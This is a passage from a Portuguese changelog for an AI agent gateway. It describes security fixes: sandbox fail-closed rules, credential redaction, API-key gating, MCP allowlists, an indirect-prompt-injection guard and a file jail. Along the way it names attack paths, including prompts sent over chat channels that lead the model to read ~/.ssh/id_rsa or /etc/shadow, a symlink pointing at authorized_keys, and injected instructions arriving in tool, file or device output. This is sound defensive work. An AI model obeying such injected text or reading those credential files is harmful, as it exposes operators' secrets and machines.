  la nao existe canal de confirmacao humana, entao o sandbox e a unica camada
  que pode conter o que passa do tier arriscado.
  Secao ausente continua sendo `mode: off`: zero mudanca de comportamento
  para quem ja tem config, e ha teste afirmando que o default da secao e
  byte a byte o `SandboxPolicy::default()`.
- **`garra config check` passa a recusar sandbox que parece ligado e nao
  esta (#1225).** Erro quando `mode != off` sem `backend` (todo comando falha
  fechado, o que e seguro e inutil) e quando `backend: ssh` esta sem
  `ssh_host`. Aviso quando `backend: ssh` vem com `network_disabled` ou
  `mount_workdir` ligados, dizendo com todas as letras que o backend SSH e
  execucao remota e nao sandbox, e que ele ignora os dois campos; quando
  `elevated` (as tools que escapam e rodam NO HOST) esta preenchido sem
  `tool_confirmation_enabled`; e quando `mode: allowlist` vem com
  `sandboxed_tools` vazio, que sandboxa exatamente nada. Nenhum finding ecoa
  o `ssh_host`, e ha teste so para isso.
- **Documentado o que cada backend realmente garante (#1225).**
  `docs/security/threat-model.md` ganhou a secao 5.13 com a tabela backend x
  garantia (rede, sistema de arquivos, privilegios, onde roda, o que NAO
  cobre) e tres limites que estavam so no codigo: hoje somente a tool `bash` e
  envolvida — `run_tests`, `git_diff`, `code_review` e `repo_search` seguem
  nascendo no host mesmo com `mode: all`; o backend `ssh` isola o host local e
  nada mais; e na pratica isto e unix, porque no Windows o bash tool usa
  `powershell -Command` e nao reparseia o quoting POSIX do wrap. O
  `config.hardened.example.yml` traz o exemplo com os mesmos avisos, e
  `/api/settings` mostra `security.sandbox_mode` e `security.sandbox_backend`
  como leitura (o PATCH da rota ainda e dry-run, entao um controle de
  contencao nao pode aparecer como editavel la). As mensagens de erro do
  `wrap_command` foram corrigidas para a chave que passa a existir.
- **Sandbox: `backend: ssh` passa a recusar fail-closed a policy que nao consegue
  honrar (#1225 S3, ADR 0019).** O ramo SSH do `wrap_command` monta
  `ssh <host> -- sh -lc ...` e nada mais — nao existe `--network none` nem mount do
  `cwd` numa sessao ssh —, e ate aqui ele simplesmente **ignorava**
  `agent.sandbox.network_disabled` e `agent.sandbox.mount_workdir`. Como o default das
  duas e `true`, um `agent.sandbox` com `backend: ssh` e `ssh_host` e mais nada lia como
  "rede desligada, workdir contido" quando nenhuma das duas era verdade: fail-open por
  omissao, na chave que promete contencao. O `garra config check` so avisava.
  Agora a recusa mora no proprio `wrap_command` — o ponto unico por onde gateway,
  `garra chat` e `garra mcp-agent` passam, e que tambem cobre policies montadas por
  codigo sem passar por config nenhuma: enquanto qualquer uma das duas flags estiver
  `true`, a tool `bash` responde erro claro nomeando a chave real e a acao, e nenhuma
  linha `ssh ...` e montada. A checagem roda antes do `is_available()`, para que num host
  sem cliente ssh o erro de "backend nao encontrado" nao mascare este. O
  `sandbox_policy_from` NAO desliga as flags nem rebaixa o modo por conta propria — passa
  tudo intacto e emite `warn!` no boot (sem o host) para o problema ter nome antes do
  primeiro comando recusado. O `garra config check` sobe de Warning para **Error**, um por
  chave ligada, com a mesma mensagem.
  A unica forma de `ssh` passar e `agent.sandbox.network_disabled = false` **e**
  `agent.sandbox.mount_workdir = false` explicitos: o `false` e o reconhecimento do
  operador de que ssh e execucao remota SEM isolamento de rede nem de mount. `docker` e
  `podman` honram as duas e nao sao afetados. A superficie `agent.sandbox` entrou depois
  da v0.4.2 e nao saiu em release, entao nao ha migracao para ninguem. Tabela de garantias
  por backend em `docs/security/threat-model.md` secao 5.13 atualizada, com o exemplo minimo de
  config ssh que passa.
- **Multipart acima de 16 MiB passa a ter checksum SHA-256 verificado por
  parte pelo servidor (#1229).** O `put_stream` do `S3Compatible` nao
  declarava algoritmo nenhum no `create_multipart_upload`, deixava o SDK
  carimbar um CRC32 default em cada `upload_part` e mandava so ETags no
  `complete`: tres pontos do mesmo upload discordando sobre o que deveria ser
  verificado, num caminho que nenhum teste jamais exercitou de verdade
  (#1230). Agora os tres declaram SHA-256, o mesmo algoritmo que o `put` de
  uma parte so ja usava, e o servidor recusa a parte cujos bytes nao batam com
  o digest declarado. `S3Compatible::new` tambem passa a FIXAR
  `request_checksum_calculation` em `WhenSupported` depois de herdar a config
  do ambiente, para que `AWS_REQUEST_CHECKSUM_CALCULATION=WHEN_REQUIRED` no
  deploy nao consiga rebaixar a garantia — os checksums que importam sao
  explicitos por operacao e o SDK ja os respeita, entao o pin cobre as
  operacoes sem algoritmo nomeado e a regressao futura em que alguem remova o
  `.checksum_sha256(...)`. O checksum composto do S3 (`<digest>-<n>`) e o ETag
  do multipart continuam nunca aparecendo como `etag_sha256`: esse campo e
  sempre o SHA-256 do arquivo inteiro.

  Junto vem o que faltava para conseguir enxergar falha nesse caminho. O
  mapeamento de erro do backend S3 descartava codigo e mensagem do servidor —
  o `Display` de `SdkError` rende literalmente "service error", entao um
  `NotImplemented` (HTTP 501) chegava ao log como
  `Backend("s3 put_object: service error")` e nao dizia nada. Agora carrega
  codigo, mensagem e status HTTP, sem expor URI assinada nem header de
  credencial; de quebra, um 404 de `HEAD` sem codigo de erro no corpo passa a
  virar `NotFound` pelo status, para `exists` responder `false` em vez de
  erro. E o teste de SSE parou de so confiar no eco do MinIO: le de volta o
  `x-amz-server-side-encryption` do objeto gravado, ou cai.
- **A isencao por `.` da redacao de stderr entregava a chave inteira
  (#1238).** A regra poupava uma sequencia longa quando ela continha `.` ou
  `@`, marcas que nenhum alfabeto base64 produz. So que `.` e `=` estavam os
  dois DENTRO da sequencia, entao `state.creds=<chave>` era UMA sequencia so:
  o ponto do nome vizinho a isentava e a credencial saia junto. E o mesmo
  mecanismo ja documentado para `-`/`_` — "um nome de chave vizinho cola na
  sequencia" —, que so nao tinha sido aplicado ao `.`. Medido sobre 2000
  chaves de 32 B por celula, nos dois alfabetos: `creds.noiseKey=<chave>` e
  `at state.creds=<chave>` entregavam a chave INTEIRA em 100% dos casos,
  enquanto os dois contextos ja medidos (`noiseKey=` e `npm ERR! _auth=`)
  seguiam em 0%. A forma nao vem do `bridge.mjs`, que nao tem `console.*`;
  vem de um `throw` de dentro do Baileys, de modulo de terceiro ou de
  template literal com caminho de propriedade. Agora `.` e `@` sao
  separadores e nao marcas de isencao: a isencao vale por SEGMENTO, e os
  quatro contextos caem para 0%, com o maior pedaco em claro em ~1,3
  caractere. A lista de separadores nao cresce alem desses dois, porque cada
  candidato quebra um alfabeto inteiro — medido, `-`/`_` separando entregam
  ~62% das chaves url-safe e `/` separando entrega ~35% das chaves do base64
  padrao. O preco, medido sobre um corpus de 14 linhas reais de erro de
  Node/npm: 10 saem identicas e 4 perdem UM segmento do meio do caminho; em
  tres delas some o prefixo de instalacao e fica a parte informativa
  (`@whiskeysockets/baileys/lib/index.js:42:7`), e numa delas o segmento de
  40 caracteres que some e o proprio nome do modulo. O novo caso ganhou teste
  de ponta a ponta no call site, com processo de verdade.
- **A nota sobre os limites da varredura do fonte prometia completude que a
  medicao desmente (#1238).** Ela dizia que `#[serde(transparent)]` era "o
  unico caminho" que nem a allowlist de `expose()` nem a varredura de macro
  enxergam. Sao pelo menos tres, e os outros dois foram plantados e medidos:
  um `impl Deref<Target = str>` mais um `let cru: &str = b;` logado noutro
  arquivo passa 107/107 verdes, e o campo cru renomeado dentro do proprio
  `session.rs` (`let cru = &self.0;` e depois `%cru`) tambem passa 107/107 —
  o `.0` da lista de proibidos so e consultado dentro do bloco da macro, entao
  o controle `%self.0` direto ficava vermelho e o renomeado passava. Nenhum
  dos dois e vazamento vivo: os dois exigem codigo novo escrito e revisado. A
  familia certa e "qualquer conversao de tipo que produza `&str`", e a nota
  agora diz isso. Fecharam-se os dois: os `impl` que mencionam `SessionBlob`
  e o derive do tipo passaram a ter allowlist de DECLARACAO — porque a
  conversao acontece no tipo, e o call site que a dispara e indistinguivel de
  qualquer outro `let` — e o campo cru ganhou a mesma regra invertida que o
  `expose()` ja tinha, com allowlist por linha inteira. A serializacao
  transparente segue sendo buraco conhecido, de proposito e por escrito.
- **A redacao do stderr da ponte deixava metade de uma credencial passar
  (#1238).** Ela varria sequencias de `[A-Za-z0-9+=]`, com a barra de fora
  para nao redigir caminhos de arquivo. So que a barra faz parte do alfabeto
  base64 padrao e aparece a cada ~64 caracteres, entao ela quebrava a propria
  chave em pedacos curtos demais para serem cortados. Medido sobre 2000 chaves
  de 32 B: o maior pedaco em claro tinha 17 dos 44 caracteres em media, e em
  35% dos casos metade ou mais da chave sobrevivia; o teto de 240 caracteres
  por linha nao ajudava, porque 240 caracteres tambem sao 240 caracteres de
  credencial. A sequencia agora inclui `/`, `.`, `@`, `-` e `_`, e so e
  poupada quando tem `.` ou `@` — extensao de arquivo ou escopo de pacote
  npm, que nenhum alfabeto base64 produz. Com isso o vazamento cai para ruido
  (~1,3 caractere) tanto no base64 padrao quanto no url-safe, em quatro
  contextos diferentes, e os caminhos que a cauda existe para mostrar
  continuam legiveis. Isentar tambem `-` e `_`, que caminho real tem, seria a
  escolha obvia e e a errada: medido, `npm ERR! _auth=<chave>` volta a vazar
  os 44 de 44 caracteres em 100% dos casos, porque o `_` do nome do campo
  entra na mesma sequencia e isenta a chave junto. Isentar `/` "junto de"
  `-`/`_` tambem nao serve: a chave em base64 padrao traz a propria barra, e o
  vazamento inteiro volta em 48,8% dos casos. O preco aceito e um falso
  positivo conhecido — caminho longo sem ponto e sem `@` vira `<redigido>`.
- **A redacao passou a ser exercitada nos dois lugares em que ela e aplicada
  (#1238).** Ela tinha teste como funcao pura e nenhum nos dois call sites:
  neutralizar os dois — devolver a linha crua em vez da redigida — desfazia a
  correcao inteira com a suite toda verde. Agora ha um teste de ponta a ponta
  para cada um, com processo de verdade cuspindo material de credencial no
  stderr.
- **A varredura do proprio fonte ficava cega a partir de um `#[cfg(test)]`
  sobre item sem chave (#1238).** Ela ligava o modo "apaga" ao ver o atributo
  e so o desligava na primeira linha com `}`. Sobre `mod tests;`, `use …;`,
  `const …;` ou `static …;` — item que fecha em `;` e nunca abre bloco — o
  modo seguia apagando **producao** ate topar com uma chave de fechamento
  qualquer, la adiante. As tres varreduras do modulo leem esse mesmo texto,
  entao ficavam cegas juntas e a comparacao entre elas continuava batendo:
  verde com bug. `mod.rs` ja tem um `#[cfg(test)] mod source_scan;` na
  arvore — o dano era zero so porque ele esta na ultima linha do arquivo, e
  move-lo para o topo cegaria o arquivo inteiro sem nenhum teste piscar. A
  primeira correcao cobriu so o atributo em linha propria; com atributo e item
  na MESMA linha (`#[cfg(test)] use std::fmt;`) o furo continuava aberto, e
  aninhado dentro de um `mod` ele escapava tambem da guarda que olhava so a
  coluna 0. Agora o cortador trata o resto da linha do atributo, e a guarda
  alcanca item de producao em qualquer profundidade — por indentacao, e nao
  contando chaves, para nao errar junto com o que ela vigia.
- **Um comentario no FIM da linha do `#[cfg(test)]` ainda cegava a varredura
  (#1238).** A correcao anterior tratava comentario no COMECO da linha e nao
  no fim: em `#[cfg(test)] use std::fmt; // so no teste` o texto termina em
  `teste` e nao em `;`, entao o item ficava pendente, a linha seguinte era
  julgada como se fosse ele, e a primeira que abrisse chave ligava o modo
  "apaga" sobre producao. Medido com as funcoes reais, as duas varreduras
  voltavam zero achado sobre um `expose()` plantado. A guarda que deveria ser
  a segunda opiniao ficava MUDA quando o item apagado comecava com
  `pub(crate)`, comum nesta crate: a lista de prefixos tinha `pub ` e nao
  `pub(`. Agora o comentario de fim de linha e cortado respeitando literais —
  contar aspas, a solucao obvia, quebra tanto `"http://x"` quanto
  `const S: &str = "a // b";` — e a lista de prefixos ganhou `pub(`, `mod`,
  `use` e `unsafe`, de modo que qualquer falha residual apareca alto. A guarda
  passou a examinar 293 itens de producao contra 258. O buraco era latente: a
  arvore nao tinha nenhum caso.
- **A regra invertida do `expose()` deixou de poder sumir em silencio
  (#1238).** Numa arvore sem violacao, "zero achados" nao distingue regra viva
  de regra ausente, e arrancar a allowlist inteira deixava o teste verde. O
  caso negativo virou texto plantado dentro do proprio teste — incluindo o
  `let s = blob.expose(); let t = s;` que motiva a inversao existir. E
  `SessionBlob::expose()` virou `pub(crate)`: o compilador passa a impedir de
  graca o que a allowlist textual impedia com esforco.
- **A cauda do stderr do Node deixa de sair verbatim no terminal (#1238).** Ela
  e a unica saida crua de ferramenta externa do fluxo de vinculo do WhatsApp, e
  nada a redigia: o lado JS redige JID e digitos, mas nao base64 de credencial,
  e um `throw` vindo de dentro da biblioteca nem passa por la. Agora sequencias
  longas que parecem material cifrado viram `<redigido: N caracteres>` e a
  linha tem teto de comprimento, sem perder o que a cauda existe para mostrar
  (caminho de arquivo, nome de modulo, numero de linha).
- **A varredura que impede log de sessao passou a ser uma regra fechada
  (#1238).** Ela reprovava uma lista de macros conhecidas; um `eprintln!` ou um
  `tracing::event!` com o valor da sessao passavam, e nenhuma varredura de
  macro alcancaria `let s = blob.expose(); let t = s;`. A regra foi invertida:
  toda ocorrencia de `SessionBlob::expose()` no codigo de producao do modulo
  precisa estar numa allowlist de call sites nomeados — hoje ha exatamente
  dois. O parser tambem deixou de ficar cego quando o fonte tem um literal de
  char com aspa dentro (`b'"'`), que invertia todas as fronteiras de literal
  e fazia o arquivo inteiro render zero bloco, em silencio.
- **A conta da sessao recusa nomes de dispositivo do Windows (#1238).**
  `con`, `prn`, `aux`, `nul`, `com1`-`com9` e `lpt1`-`lpt9` casavam a allowlist
  `[A-Za-z0-9_-]` e nao podem virar diretorio no Windows. A recusa e
  case-insensitive e da um erro que diz o que houve, em vez de um
  `ERROR_INVALID_NAME` opaco no meio da criacao do diretorio.
- **O gate de `gateway.api_key` passa a cobrir o plano de conversa e o A2A (#1240).**
  `POST /v1/chat/completions`, `POST /v1/messages`, `POST /v1/messages/count_tokens`
  e todo o `/a2a/*` estavam montados no mesmo router cru que `/api/*`, mas fora do
  gate, que testava so o prefixo `/api/`. A justificativa original — "`/v1/*` tem
  JWT proprio" — vale para o `rest_v1` do workspace e para o `/v1/auth/*`, e nao
  para as rotas compat OpenAI/Anthropic, que nao resolvem identidade nenhuma. Era
  fail-open de um controle que o operador tinha ligado: quem configurava a chave
  acreditava ter fechado a porta, e a superficie que executa as tools do GarraIA na
  maquina dele seguia respondendo a qualquer `curl`. O recorte agora e um conjunto
  explicito: `/api/` menos a allowlist de descoberta, mais as tres rotas de
  conversa por igualdade exata, mais `/a2a/` por prefixo. As duas rotas compat
  Anthropic aceitam a chave tambem em `x-api-key`, porque o Claude Code e o SDK da
  Anthropic nunca mandam `Authorization: Bearer`; nunca por query string.
  `/v1/models`, `/.well-known/agent.json`, `/health` e `/ping` seguem abertas.
  **Sem `gateway.api_key` configurada nada muda** — este PR nao fecha nada por
  default.

  **O socket do papagaio (`/ws/parrot`) entrou junto**, achado pela auditoria R4
  do PR. Ele executa um turno completo do agente — com as tools e a chave de LLM
  do dono — sobre a sessao persistente do Garra Desktop, e a unica guarda que
  tinha era o anti-CSRF da #1182, que passa de proposito quando nao ha header
  `Origin`, porque cliente nao-navegador (app, CLI, `curl`) nao manda um. Com a
  chave configurada e o gateway em `0.0.0.0` — o caso do app na LAN, que e o
  motivo de a chave existir — um `websocat ws://host:3888/ws/parrot` conectava
  sem credencial e dirigia o agente na maquina do dono. O irmao `/ws`, montado na
  linha de cima do `router.rs`, ja checava a chave desde a #1045. A checagem ficou
  **dentro do handler**, e nao na lista de caminhos do middleware: o middleware so
  le header, e a webview Tauri abre o overlay com `new WebSocket(...)`, que nao
  manda header — gatear a rota la fecharia o desktop em vez de autentica-lo. Como
  no `/ws`, a chave vai por `?token=` / `?api_key=` ou por bearer, com a mesma
  comparacao de tempo constante e o mesmo 401.

  **E o Garra Desktop passou a de fato mandar essa credencial**, fechando o
  outro lado do mesmo buraco: o gate acima recusava o handshake, mas o
  `ui/ws.js` conectava numa URL constante, sem token nenhum, e nao havia
  plumbing de credencial em lugar nenhum da casca Tauri. Com a chave
  configurada — o caso comum desde que o #1252 passou a gera-la sozinha em
  bind exposto — o overlay e a Chat Bar levavam 401 e caiam em reconexao
  infinita com backoff ate 30s, sem nenhum aviso ao usuario. Agora um comando
  Tauri `gateway_api_key` le a chave do **mesmo** `config.yml` que o gateway
  carregou (via `garraia_config::ConfigLoader`, o resolvedor de path canonico,
  que honra `GARRAIA_CONFIG_DIR` e o diretorio legado) e o `ws.js` a manda por
  `?token=`, no mesmo formato do `webchat.html`. A copia do config default no
  primeiro boot passou a usar esse mesmo resolvedor, em vez de remontar o path
  a mao, para que as duas pontas nunca discordem de qual arquivo vale. Sem
  chave configurada o socket conecta na URL nua, como sempre.
- **`garra init` numa VM como root nao deixa mais o gateway na internet sem credencial
  nenhuma (#1241).** O wizard escolhe `gateway.host = 0.0.0.0` sempre que a maquina parece
  server-like — e `is_server_like()` e `is_runpod || is_root`, ou seja, qualquer instalacao
  como root, nao so RunPod. Nesse caminho ele nunca escrevia `gateway.api_key` (os unicos
  `api_key` que o wizard escrevia eram os de `llm.*`), e sem chave o gate de `/api/*` e do
  `/ws` devolve todo pedido a `next` na primeira linha: sessoes, memoria, providers, logs,
  diagnosticos e o canal do agente com as tools abertos a quem alcancasse a porta. Agora,
  quando o host resolvido nao e loopback, o wizard sorteia 32 bytes do CSPRNG do sistema
  (`garraia_security::random_bytes`, o mesmo `ring` do resto do projeto) e grava em
  `gateway.api_key`. Bind em loopback (o caso do laptop) nao muda em nada: nenhuma chave
  gerada, nenhuma linha nova impressa.
- **A credencial gerada nao e impressa no terminal (#1241).** O resumo do wizard diz em que
  arquivo e em que campo ela esta, e a linha de `curl` sai com um placeholder no lugar do
  segredo. Imprimir era conveniencia e nao necessidade — a chave acabou de ser gravada no
  `config.yml` do proprio operador —, e o custo era real: scrollback do terminal, `tee` ou
  pipe da saida do `init`, captura de stdout em automacao. O CodeQL apontou esse fluxo
  (`rust/cleartext-logging`) e estava certo; a correcao foi parar de imprimir, sem entrada
  nova no ledger de supressoes. A mensagem anterior tambem afirmava "guarde agora, ela nao
  e impressa de novo", o que era falso: a chave esta no arquivo, e acreditar nisso levava
  justamente a re-rodar o wizard por panico.
- **O `config.yml` e criado ja em modo 0600 (#1241).** Antes ele nascia com
  `0666 & ~umask` — normalmente 0644 — ja contendo a credencial, e so depois
  `harden_secret_file` fazia o `chmod`. Entre as duas coisas havia uma janela em que
  qualquer usuario da maquina podia ler o segredo. Agora o modo entra no proprio `open(2)`;
  o `harden_secret_file` continua como cinto-e-suspensorio, porque no caminho de merge o
  arquivo ja existia e `mode` so vale na criacao.
- **Re-rodar o wizard e escolher "Merge / update" nao derruba os clientes ja configurados
  (#1241).** Nesse caminho a credencial gerada so entra quando a do config esta ausente ou
  em branco — a mesma normalizacao que o gate de `/api/*` usa para decidir que nao ha gate.
  Chave escolhida pelo operador nunca e sobrescrita ali, e o resumo, nesse caso, avisa do
  bind exposto sem imprimir segredo nenhum. **A opcao "Backup the existing config and write
  a new one", que e o default do menu, tem o comportamento oposto e sempre teve:** o config
  e reconstruido do zero, entao uma `gateway.api_key` que ja existia e substituida pela nova
  e os clientes antigos param de autenticar. O resumo agora diz isso em uma linha, e o valor
  anterior continua no arquivo `.bak-` gerado ao lado.
- **O boot avisa quando o bind alcanca a rede e nao ha credencial (#1241).** O gateway so
  logava "listening on". Agora, depois do bind e uma vez por processo, um `warn!` nomeia o
  endereco efetivamente ligado, o que esta aberto (`/api/*` e tambem o `/ws`, que e o canal
  do agente com as tools) e as duas correcoes (`garra init` ou `gateway.api_key` no config;
  `--host 127.0.0.1` para ouvir so localmente). A checagem roda sobre o endereco ligado, e
  nao sobre o arquivo de config, justamente para cobrir o override por `--host`/`HOST` do
  `garra start`, que o `garra config check` nao enxerga. Em `garra start -d` e
  `restart -d` o mesmo texto sai em stderr **antes** do fork: depois dele o tracing aponta
  para `~/.garraia/garraia.log` e o aviso nunca chegaria ao terminal — justamente no modo
  que o `install.sh` recomenda e que uma unit systemd usa. O boot **nao** e recusado: quem
  roda assim de proposito atras de firewall continua subindo.
- **`garra config check` e o Web Console pararam de dar falsa garantia sobre a credencial
  (#1241).** Os dois reportavam pela presenca do campo (`is_some()`), entao um
  `api_key: "  "` aparecia como configurado enquanto o gate estava desligado — falsa
  garantia exatamente para quem foi consultar o diagnostico. A normalizacao agora mora num
  lugar so, `GatewayConfig::api_key_normalizada`, e o gate, o `config check` e o
  `GET /api/settings/effective` leem dela.
- **O exemplo minimo do `garra init` sem TTY passou a incluir a secao `gateway` (#1241).**
  Esse e o caminho de container e CI, que e onde `HOST=0.0.0.0` tem mais chance de estar
  setado e onde nao ha wizard para mintar credencial nenhuma.
- **Reiniciar um servidor MCP pela admin API nao apaga mais a allowlist de tools dele (#1242).**
  `POST /admin/api/mcp/{id}/restart` reconectava passando `vec![]` como `allowed_tools`
  nos dois transportes, e lista vazia significa "permite tudo" — enquanto o `disconnect`
  imediatamente antes ja tinha descartado a unica copia da allowlist, guardada na
  conexao. O efeito era um fail-open silencioso: depois de um hot-reload de rotina, toda
  tool descoberta daquele servidor voltava chamavel pelo LLM, sem nenhum sinal para o
  operador. O boot e o reconnect automatico do monitor de saude sempre fizeram certo; so
  este caminho esquecia. Agora o handler resolve a allowlist ANTES do `disconnect`, por
  uma ordem nomeada cujo invariante e preciso: **o restart nunca alarga o que esta em
  vigor, e aplica a lista declarada quando nada esta em vigor.** Uma lista viva nao
  vazia no `McpManager` (conexao viva ou entrada em `pending`) e o que de fato
  restringe o servidor agora e vence; caso contrario — `None`, ou `Some(vec![])`, que e
  como `is_tool_allowed` escreve "permite tudo" — vale o `allowed_tools` declarado. Um
  `Some(vec![])` quer dizer "ninguem nunca restringiu este nome", nao "o operador
  escolheu nao restringir": o manager nao distingue os dois casos e o config escrito
  distingue, entao tratar a lista viva vazia como resposta autoritativa deixava um
  servidor que subiu antes da allowlist ser declarada sem nenhuma forma de ser apertado
  por um restart. So quando nem o manager nem a declaracao conhecem uma restricao a
  lista fica vazia — caso dos servidores criados por `POST /admin/api/mcp`, que hoje nao
  tem como carregar allowlist nenhuma. O que o handler deliberadamente NAO faz: aplicar
  uma declaracao mais estreita que uma lista viva nao vazia; a regra 1 preserva a lista
  viva, entao o restart segue sem alargar, mas esse aperto pede restart do gateway.
- **A allowlist declarada no `mcp.json` passou a ser honrada pelo restart (#1242).**
  A resolucao consultava so a secao `mcp:` do `config.yml`. O boot nao le isso: le
  `ConfigLoader::merged_mcp_config`, que e `mcp.json` **mais** aquela secao, e a entrada
  do `mcp.json` desserializa em `garraia_config::McpServerConfig`, que tem
  `allowed_tools`. Uma allowlist escrita no `mcp.json` valia no boot e era invisivel
  para o restart, que caia no ramo "nunca restringido" e reconectava o servidor aberto.
  O restart agora resolve contra o mesmo merge que o boot le.
- **Um restart recusado deixou de ser a ultima forma de perder a allowlist (#1242).**
  As duas validacoes de 400 (`stdio` sem `command`, HTTP sem `url`) rodavam DEPOIS do
  `disconnect`, entao a recusa voltava de um servidor ja derrubado cuja allowlist
  resolvida morria no stack frame — e o restart seguinte lia `None` e reconectava
  aberto. Alcancavel em duas chamadas de admin, porque `POST /admin/api/mcp` aceita
  `{"url": ..., "transport": "stdio"}` e sobrescreve a entrada de um servidor vivo.
  `command`/`url` passaram a ser extraidos antes de qualquer teardown: a recusa agora
  nao derruba nada e a conexao viva segue restrita.
- **Dois buracos vizinhos, fechados junto (#1242).** Um restart cujo reconnect falha
  estaciona o servidor em `pending` com a allowlist resolvida, entao o restart seguinte
  nao le mais `None`; e o boot passou a estacionar tambem falha de handshake em
  transporte HTTP, nao so stdio, entao o primeiro restart de um servidor HTTP com
  allowlist nao reconecta mais aberto. Junto, `tool_info()` passou a filtrar pela
  allowlist como `take_tools` e `call_tool` ja faziam, entao o `tool_count` da resposta
  do restart para de contar tool bloqueada e os slash-commands MCP param de registrar
  tool que toda execucao ia recusar.
- **A saida de `device_read`/`device_list` (e o retorno de `device_execute`)
  entra no contexto do modelo pelo guard de injecao indireta (#1243,
  fatia 3).** Id de dispositivo, nome de capability, `state` do Home
  Assistant e payload de MQTT/serial sao escritos por quem esta no
  barramento, e leitura e R0 — acontece sem confirmacao humana. Agora
  as tools de hardware passam o texto do bus por
  `garraia_security::sanitize_indirect` (caracteres invisiveis
  removidos; suspeito chega precedido do banner de dado nao-confiavel,
  com a origem nomeada). A moldura vive na tool do runtime, nao na
  crate `garraia-hardware`, pela regra do ADR 0020 de a crate de
  hardware nao classificar o proprio risco. Dispositivo que nomeia a
  si mesmo com instrucao e leitura hostil chegam emoldurados; leitura
  limpa segue byte a byte. Pendencias da issue: nenhuma — as tres
  fatias de codigo estao fechadas.
- **A saida de `file_read` entra no contexto do modelo pelo guard de
  injecao indireta (#1243, fatia 2).** O conteudo de arquivo e dado de
  terceiro: quem controla o arquivo controla o texto, e ate aqui ele
  chegava cru. Agora `FileReadTool::execute` passa o conteudo por
  `garraia_security::sanitize_indirect` (caracteres invisiveis
  removidos; suspeito chega precedido do banner de dado nao-confiavel,
  com a origem nomeada) e o criterio de nao-mutilacao e testado
  explicitamente: codigo-fonte limpo segue byte a byte, sem banner e
  sem corte. Payload com instrucao injetada chega emoldurado. Pendencia
  restante da issue: `device_read`/`device_list` (fatia 3).
- **O resultado de tool MCP entra no contexto do modelo pelo guard de
  injecao indireta, com teto de bytes (#1243, fatia 1).** O guard entregue
  na #1213 estava ligado em um ponto so (`web_fetch`); todo outro canal
  por onde texto de terceiro chega ao modelo escapava dele. O canal mais
  grave era o MCP: um servidor de terceiro — tipicamente um `npx` buscado
  sob demanda — devolvia texto que entra no contexto cru, sem guard e sem
  teto de tamanho, e um payload gigante era vetor de exaustao de
  contexto/custo. Agora `McpTool::execute` passa o conteudo por
  `garraia_security::sanitize_indirect` (caracteres invisiveis removidos;
  suspeito chega precedido do banner de dado nao-confiavel, como no
  `web_fetch`) e ganha teto de 256 KiB alinhado ao
  `MAX_CONNECTOR_FRAME_BYTES` dos conectores, com truncamento explicito e
  visivel — nunca em silencio, e nunca no meio de um caractere UTF-8
  multibyte (corte por fronteira de char). Prova ponta a ponta com
  servidor MCP de verdade: payload com instrucao injetada chega
  emoldurado; payload de 300 KiB chega truncado com marca. Pendencias
  nomeadas na issue: `file_read` (fatia 2) e `device_read`/`device_list`
  (fatia 3); a cobertura real agora esta nomeada no threat-model §5.5 e
  na tabela de comparacao (que vendia cobertura de `review` que nao
  existia).
- **As file tools do agente passam a ter jail de diretorio — `~` e caminho
  absoluto nao resolvem mais em qualquer lugar do disco (correcao da #1244).**
  `file_read`, `file_write` e `list_dir` recebiam o caminho cru do modelo,
  expandiam `~` e aceitavam caminho absoluto sem confinamento nenhum. O
  parametro `allowed_directories` existia e tinha teste — e os dois pontos de
  registro em producao (`bootstrap/mod.rs` do gateway e `chat.rs` da CLI)
  passavam `None`. Era a quinta instancia do mesmo defeito neste repositorio:
  funcao de seguranca bem testada cujo ponto de chamada em producao nenhum
  teste exercitava.
  A consequencia era direta: um prompt chegando por Telegram, Discord ou
  WhatsApp mandava o modelo ler `~/.ssh/id_rsa`, `/etc/shadow` ou o proprio
  `config.yml` do gateway — que carrega chave de LLM em claro quando o
  operador nao usa o cofre. E `list_dir` era o reconhecimento: com ela o
  modelo achava o alvo antes de pedir a leitura.
  Agora existe `garraia_agents::FileJail`. As raizes efetivas de uma chamada
  sao a uniao de `agent.file_roots` (config, vazio por padrao, mais a env
  `GARRAIA_FILE_ROOTS`) com o `working_dir` da sessao. Conjunto vazio significa
  **negar tudo**, nao "tudo liberado": sem raiz conhecida nao ha como afirmar
  que um caminho e seguro. No gateway isso faz a raiz default ser o diretorio
  da sessao e nada mais — e o `working_dir` de uma sessao ja passa por
  `project_root::confine` antes de ser gravado. Na CLI o CWD do processo entra
  como raiz, porque quem roda `garra chat` e o dono da maquina no diretorio que
  escolheu.
  O confinamento canonicaliza **antes** de comparar, e compara componente a
  componente. Isso cobre os quatro vetores: `..`, symlink que aponta para fora
  da raiz, `~` que expande para fora dela e caminho absoluto. Para escrita, em
  que o alvo ainda nao existe e `canonicalize` falharia, o jail sobe ate o
  ancestral existente mais proximo e canonicaliza ele — e o que barra
  `raiz/link-para-fora/novo.txt`, que uma checagem so do `parent` textual
  deixaria passar.
  Um quinto vetor entrou depois da auditoria de seguranca, e e o contraintuitivo:
  `canonicalize` falhar nao quer dizer "nao existe", quer dizer "nao resolve".
  Um symlink **pendurado** — cujo alvo nao existe — falha no `canonicalize` e
  existe para o `lstat`, e o `open(O_CREAT)` de uma escrita segue o link e cria
  o arquivo no alvo, fora da raiz. Bastava um repositorio clonado trazer
  `raiz/evil -> ../../../home/u/.ssh/authorized_keys` versionado no git. Agora
  cada componente que nao canonicaliza passa por `symlink_metadata`: existir
  para o `lstat` sem resolver e recusa. O caminho e normalizado por
  `components()` antes desse `lstat`, porque com barra final (`raiz/evil/`) o
  `lstat` segue o link por POSIX e o pendurado voltaria a parecer inexistente.
  Um pendurado apontando para dentro da raiz tambem passou a ser recusado —
  fail-closed assumido, para nao reimplementar resolucao de symlink a mao.
  A recusa devolve **uma unica frase** ao modelo, sem o caminho, sem a raiz e
  sem distinguir "nao existe" de "existe mas esta fora" — as tres recusas sao
  byte-identicas, para a tool nao virar oraculo de existencia de arquivo. A
  mensagem util da #923 (que diz onde procurou e por que ali) fica preservada
  para o arquivo ausente **dentro** da raiz, onde ela nao vaza nada.
  O construtor das tres tools passou a exigir o jail: `FileReadTool::new(None)`
  nao compila mais. Um jail que se pode esquecer de passar e um jail que se
  esquece de passar — foi exatamente o que aconteceu. E os testes de regressao
  do gateway nao chamam o construtor: eles pedem a tool ao runtime que
  `build_agent_runtime` montou, que e o mesmo objeto que o turno do agente usa.
  No caminho MCP (`garra_agent`) o `working_dir` passou a ser confinado antes
  de ser aceito. Ele vira raiz das file tools dentro do `FileJail`, e ali quem
  o escreve e o MODELO, pelo argumento da tool: sem a checagem,
  `{"working_dir": "/"}` devolvia o disco inteiro as file tools.
